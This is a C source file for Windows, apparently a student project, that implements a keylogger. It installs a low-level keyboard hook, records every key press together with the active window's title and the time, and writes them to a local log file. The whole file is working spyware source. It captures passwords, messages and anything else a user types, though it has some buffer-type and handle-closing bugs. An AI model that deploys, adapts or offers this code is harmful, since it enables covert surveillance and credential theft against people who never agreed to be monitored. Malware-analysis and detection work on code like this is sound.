#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment( lib, "user32.lib") 
#pragma comment( lib, "gdi32.lib")

HHOOK _hook;
BOOL shiftIsHeld = FALSE;
BOOL capsLockActivated = FALSE;
HWND currentWindow;

char* handleSpecialCase(DWORD vkCode);
int openOrCreateFile(char* filename);

int writeLogs (KBDLLHOOKSTRUCT kbdStruct, LPARAM lParam)
{
    HANDLE hFile;
    DWORD dwBytesToWrite;
    DWORD dwBytesWritten;
    BOOL bErrorFlag = FALSE;
    char keyString[20];
    char filename[] = "c:\\Users\\Titouan\\Documents\\42\\tinky-winkey\\logs.txt";

    hFile = openOrCreateFile(filename);
    if (hFile == INVALID_HANDLE_VALUE)
        return -1;

    PSTR windowTitle;
    HWND foreground = GetForegroundWindow();
    if (foreground)
    {
        int cTxtLen = GetWindowTextLengthW(foreground);
        printf("WINDOW LENGTH: %i", cTxtLen);
        windowTitle = (PSTR) VirtualAlloc((LPVOID) NULL, (DWORD) (cTxtLen + 1), MEM_COMMIT, PAGE_READWRITE); 
        GetWindowTextW(foreground, windowTitle, cTxtLen + 1);
        // for (int i =0; i < cTxtLen; i++)
        //     windowTitle[i] = 'a';

        if (!currentWindow || currentWindow != foreground)
        {
            currentWindow = foreground;
            SYSTEMTIME st;
            GetLocalTime(&st);
            PSTR header = (PSTR) VirtualAlloc((LPVOID) NULL, (DWORD) (cTxtLen + 1024), MEM_COMMIT, PAGE_READWRITE); 
            snprintf(header, cTxtLen + 1024, "\n[%ls - %02d:%02d]\n", windowTitle, st.wHour, st.wMinute);
            printf("GOT A CHANGE ADDING %s", header);
            VirtualFree(windowTitle, 0, MEM_RELEASE); 
            dwBytesToWrite = strlen(header);
            dwBytesWritten = 0;
            bErrorFlag = WriteFile( 
                            hFile,
                            header,
                            dwBytesToWrite,
                            &dwBytesWritten,
                            NULL);
            VirtualFree(header, 0, MEM_RELEASE); 
            if (FALSE == bErrorFlag)
                goto handle_error;
        }
    }

    // Special cases
    char* specialCase = handleSpecialCase(kbdStruct.vkCode);
    if (specialCase == NULL)
    {
        char c = kbdStruct.vkCode;
        BOOL useUpperCase = (shiftIsHeld && !capsLockActivated) || (!shiftIsHeld && capsLockActivated);
        if (!useUpperCase)
        {
            c = tolower(c);
        }
        keyString[0] = c;
        keyString[1] = '\0';
    }
    else
    {
        strcpy_s(keyString, sizeof keyString, specialCase);
    }

    char charString[16];
    DWORD threadId = foreground ? GetWindowThreadProcessId(foreground, NULL) : 0;
    BYTE keyboardState[256];
    GetKeyboardState(keyboardState);
    ToUnicodeEx(kbdStruct.vkCode, kbdStruct.scanCode, keyboardState, charString, 8, 0, GetKeyboardLayout(threadId));

    dwBytesToWrite = strlen(charString);
    dwBytesWritten = 0;
    bErrorFlag = WriteFile( 
                    hFile,
                    charString,
                    dwBytesToWrite,
                    &dwBytesWritten,
                    NULL);

handle_error:
    if (FALSE == bErrorFlag)
    {
        printf("Terminal failure: Unable to write to file.\n");
        return -1;
    }
    else
    {
        if (dwBytesWritten != dwBytesToWrite)
        {
            printf("Error: dwBytesWritten != dwBytesToWrite\n");
            return -1;
        }
    }
    CloseHandle(hFile);
    return 1;
}

// This is the callback function. Consider it the event that is raised when, in this case, 
// a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode < 0 || (wParam != WM_KEYUP && wParam != WM_KEYDOWN))
        return CallNextHookEx(_hook, nCode, wParam, lParam);

    KBDLLHOOKSTRUCT kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
    if (wParam == WM_KEYUP)
    {
        if (kbdStruct.vkCode == VK_SHIFT || kbdStruct.vkCode == VK_LSHIFT || kbdStruct.vkCode == VK_RSHIFT)
            shiftIsHeld = FALSE;
    }
	else if (wParam == WM_KEYDOWN)
	{
        if (kbdStruct.vkCode == VK_SHIFT || kbdStruct.vkCode == VK_LSHIFT || kbdStruct.vkCode == VK_RSHIFT)
            shiftIsHeld = TRUE;
        if (kbdStruct.vkCode == VK_CAPITAL)
            capsLockActivated = !capsLockActivated;
        writeLogs(kbdStruct, lParam);
    }
 
	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}
 
void SetHook()
{
	// Set the hook and set it to use the callback function above
	// WH_KEYBOARD_LL means it will set a low level keyboard hook
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
	}
}
 
void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}
 
void main()
{

    // Infinite loop listening for messages
    SetHook();
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
    }

}